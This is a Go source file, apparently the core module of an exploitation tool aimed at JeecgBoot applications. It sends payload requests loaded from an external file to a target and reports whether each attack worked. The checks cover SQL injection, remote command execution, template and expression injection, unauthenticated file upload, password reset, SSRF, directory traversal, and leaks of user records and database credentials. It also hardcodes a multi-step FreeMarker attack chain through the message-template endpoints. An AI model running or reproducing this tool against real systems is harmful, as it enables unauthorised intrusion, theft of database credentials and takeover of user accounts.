package Core

import (
	common "JeecgExploitssGo/Common"
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"
)

// 处理函数
func HandleFunc(name, url string, resBody, body []byte, u common.UnifiedInterface) bool {
	if err := json.Unmarshal(body, u); err != nil {
		// json解析失败表示不存在漏洞, 不做处理
		// common.Colors(common.ColorRed).Printf("[*]解析 json 失败, %v\n", err)
		return false
	}

	// 判空条件
	if u.IsEmpty() {
		return false
	}

	if VulName == "" {
		common.Colors(common.ColorGreen).Printf("[+]%s 存在 %s 漏洞\n", Urls, name)
	}
	u.Print()

	common.OutputFile(url, string(resBody), string(body))

	return true
}

func HandleRequest(url, token, method string, body []byte) []byte {
	var reqBody io.Reader

	if body != nil {
		reqBody = bytes.NewReader(body)
	}

	request, err := http.NewRequest(method, url, reqBody)
	if err != nil {
		common.Colors(common.ColorRed).Printf("[-]构造请求失败, %v\n", err)
		return nil
	}

	// fmt.Println(request)

	request.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:143.0) Gecko/20100101 Firefox/143.0")
	request.Header.Set("X-Access-Token", token)
	if method == "POST" {
		request.Header.Set("Content-Type", "application/json")
	}
	if strings.Contains(url, "jmreport/upload") ||
		strings.Contains(url, "commonController.do?parserXml") {
		request.Header.Set("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryyfyhSCMs9cajzFD4")
	}

	tls := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	client := &http.Client{
		Transport: tls,
		Timeout:   time.Second * 15,
	}

	response, err := client.Do(request)
	if err != nil {
		common.Colors(common.ColorRed).Printf("[-]请求URL: %s 失败, %v\n", url, err)
		return nil
	}

	defer response.Body.Close()

	resBody, err := io.ReadAll(response.Body)
	if err != nil {
		common.Colors(common.ColorRed).Printf("读取响应内容失败, %v\n", err)
		return nil
	}

	// 延时请求
	time.Sleep(time.Second * time.Duration(SetTime))

	return resBody
}

func HandleResponse() {
	Flags()
	for name, data := range common.ReadFile().Requests {
		fmt.Printf("[*]正在测试 %s\n", name)

		// var success bool
		switch name {
		case "queryTableData":
			url := common.JoinURL(Urls, data.URL)
			body := HandleRequest(url, Token, data.Method, []byte(data.Body))
			if !HandleFunc(name, url, []byte(data.Body), body, &common.QueryTableData{}) {
				continue
			}

		// qurestSql SQL注入漏洞
		case "qurestSql":
			url := common.JoinURL(Urls, data.URL)
			body := HandleRequest(url, Token, data.Method, []byte(data.Body))
			if !HandleFunc(name, url, []byte(data.Body), body, &common.QurestSql{}) {
				continue
			}

		// getTotalData SQL注入漏洞
		case "getTotalData":
			url := common.JoinURL(Urls, data.URL)
			body := HandleRequest(url, Token, data.Method, []byte(data.Body))
			if !HandleFunc(name, url, []byte(data.Body), body, &common.GetTotalData{}) {
				continue
			}

		// show SQL注入漏洞
		case "show":
			url := common.JoinURL(Urls, data.URL)
			body := HandleRequest(url, Token, data.Method, []byte(data.Body))
			if !HandleFunc(name, url, []byte(data.Body), body, &common.Show{}) {
				continue
			}

		// getDictItemsByTable SQL注入漏洞
		case "getDictItemsByTable":
			url := common.JoinURL(Urls, data.URL)
			body := HandleRequest(url, Token, data.Method, []byte(data.Body))
			if !HandleFunc(name, url, []byte(data.Body), body, &common.GetDictItemsByTable{}) {
				continue
			}

		// check SQL注入漏洞
		case "check_poc_1", "check_poc_2":
			url := common.JoinURL(Urls, data.URL)
			now := time.Now()
			_ = HandleRequest(url, Token, data.Method, []byte(data.Body))
			resTime := time.Since(now)
			if resTime > time.Second*5 {
				common.Colors(common.ColorGreen).Printf("[+]%s 存在check SQL注入漏洞\n", Urls)
				common.Colors(common.ColorYellow).Printf("[+++]payload: %s\n", data.URL)
			}

		// getDictItemsByTable 后台未授权SQL注入漏洞
		case "getDictItemsByTableBackSql":
			url := common.JoinURL(Urls, data.URL)
			body := HandleRequest(url, Token, data.Method, []byte(data.Body))
			if !HandleFunc(name, url, []byte(data.Body), body, &common.GetDictItemsByTableBackSql{}) {
				continue
			}
		// column 参数SQL注入漏洞
		case "column":
			url := common.JoinURL(Urls, data.URL)
			now := time.Now()
			_ = HandleRequest(url, Token, data.Method, []byte(data.Body))
			resTime := time.Since(now)
			if resTime > time.Second*5 {
				common.Colors(common.ColorGreen).Printf("[+]%s column参数存在 SQL注入漏洞\n", Urls)
				common.Colors(common.ColorYellow).Printf("[+++]payload: %s\n", data.URL)
			}

		// parseSql SQL注入漏洞
		case "parseSql":
			url := common.JoinURL(Urls, data.URL)
			body := HandleRequest(url, Token, data.Method, []byte(data.Body))
			if !HandleFunc(name, url, []byte(data.Body), body, &common.ParseSql{}) {
				continue
			}

		// testConnection 远程命令执行漏洞
		case "testConnection":
			url := common.JoinURL(Urls, data.URL)
			body := HandleRequest(url, Token, data.Method, []byte(data.Body))
			if !HandleFunc(name, url, []byte(data.Body), body, &common.TestConnection{}) {
				continue
			}

		// loadTableData SSTI模板注入漏洞
		case "loadTableData_poc_1", "loadTableData_poc_2":
			url := common.JoinURL(Urls, data.URL)
			body := HandleRequest(url, Token, data.Method, []byte(data.Body))
			if !HandleFunc(name, url, []byte(data.Body), body, &common.LoadTableData{}) {
				continue
			}

		// queryFieldBySql 模板注入漏洞
		case "queryFieldBySql":
			url := common.JoinURL(Urls, data.URL)
			body := HandleRequest(url, Token, data.Method, []byte(data.Body))
			if !HandleFunc(name, url, []byte(data.Body), body, &common.QueryFieldBySql{}) {
				continue
			}

		// sendMsg freemaker模板注入
		case "sendMsg":
			addURL := common.JoinURL(Urls, data.URL)
			_ = HandleRequest(addURL, Token, data.Method, []byte(data.Body))

			sendMsgURL := common.JoinURL(Urls, "sys/message/sysMessageTemplate/sendMsg")
			resBody := "{\"templateCode\":\"8\",\"testData\":\"{}\",\"receiver\":\"\",\"msgType\":\"1\"}"
			body := HandleRequest(sendMsgURL, Token, "POST", []byte(resBody))
			if !strings.Contains(string(body), "成功") {
				continue
			}

			api := "sys/message/sysMessage/list?_t=1732776144&column=createTime&order=desc&field=id,,,esTitle,esContent,esReceiver,esSendNum,esSendStatus_dictText,esSendTime,esType_dictText,action&pageNo=1&pageSize=10"
			urls := common.JoinURL(Urls, api)
			resultBody := HandleRequest(urls, Token, "GET", nil)
			if !HandleFunc(name, urls, nil, resultBody, &common.SendMsg{}) {
				continue
			}

		// AviatorScript 表达式注入漏洞
		case "aviatorScript":
			url := common.JoinURL(Urls, data.URL)
			body := HandleRequest(url, Token, data.Method, []byte(data.Body))
			if !HandleFunc(name, url, []byte(data.Body), body, &common.AviatorScript{}) {
				continue
			}

		// /jmreport/upload 接口未授权任意文件上传漏洞
		case "jmreportUpload":
			url := common.JoinURL(Urls, data.URL)
			body := HandleRequest(url, Token, data.Method, []byte(data.Body))
			if !HandleFunc(name, url, []byte(data.Body), body, &common.JmreportUpload{}) {
				continue
			}

		// commonController.do 任意文件上传漏洞
		// 未复现
		case "commonController":
			url := common.JoinURL(Urls, data.URL)
			body := HandleRequest(url, Token, data.Method, []byte(data.Body))
			if strings.Contains(string(body), "操作成功") {
				common.Colors(common.ColorGreen).Printf("[+]%s commonController接口存在任意文件上传漏洞\n", Urls)
			}

		// querySysUser 信息泄露漏洞
		case "querySysUser":
			url := common.JoinURL(Urls, data.URL)
			body := HandleRequest(url, Token, data.Method, []byte(data.Body))
			if strings.Contains(string(body), "admin") ||
				strings.Contains(string(body), "18611111111") {
				common.Colors(common.ColorGreen).Printf("[+]%s 存在%s信息泄露漏洞\n", Urls, name)
				common.Colors(common.ColorYellow).Printf("[+++]%s\n", url)
			}

		// checkOnlyUser 信息泄露漏洞
		case "checkOnlyUser":
			url := common.JoinURL(Urls, data.URL)
			body := HandleRequest(url, Token, data.Method, []byte(data.Body))
			if strings.Contains(string(body), "账号已存在") {
				common.Colors(common.ColorGreen).Printf("[+]%s 存在%s信息泄露漏洞\n", Urls, name)
				common.Colors(common.ColorYellow).Printf("[+++]%s\n", url)
			}

		// httptrace 信息泄露漏洞
		case "httptrace_poc_1", "httptrace_poc_2", "httptrace_poc_3":
			url := common.JoinURL(Urls, data.URL)
			body := HandleRequest(url, Token, data.Method, []byte(data.Body))
			if !HandleFunc(name, url, []byte(data.Body), body, &common.Httptrace{}) {
				continue
			}
			common.Colors(common.ColorYellow).Printf("[+++]payload: %s\n", url)

		// dataSource_list 接口数据库账号密码泄露
		case "dataSource_list":
			url := common.JoinURL(Urls, data.URL)
			body := HandleRequest(url, Token, data.Method, []byte(data.Body))
			if !HandleFunc(name, url, []byte(data.Body), body, &common.DataSource_list{}) {
				continue
			}

		// fileTree 目录遍历漏洞
		case "fileTree":
			url := common.JoinURL(Urls, data.URL)
			body := HandleRequest(url, Token, data.Method, []byte(data.Body))
			if !HandleFunc(name, url, []byte(data.Body), body, &common.FileTree{}) {
				continue
			}

		// passwordChange 任意用户密码重置漏洞
		case "passwordChange":
			url := common.JoinURL(Urls, data.URL)
			body := HandleRequest(url, Token, data.Method, []byte(data.Body))
			if strings.Contains(string(body), "未找到对应实体") {
				common.Colors(common.ColorGreen).Println("[+]可能存在 passwordChange 漏洞, 响应内容为未找到对应实体, 请使用存在的账号进行测试")
				continue
			}
			if !HandleFunc(name, url, []byte(data.Body), body, &common.PasswordChange{}) {
				continue
			}

		// uploadImgByHttp SSRF 漏洞
		case "uploadImgByHttp":
			url := common.JoinURL(Urls, data.URL)
			body := HandleRequest(url, Token, data.Method, []byte(data.Body))
			if !HandleFunc(name, url, []byte(data.Body), body, &common.UploadImgByHttp{}) {
				continue
			}
		}
	}
}
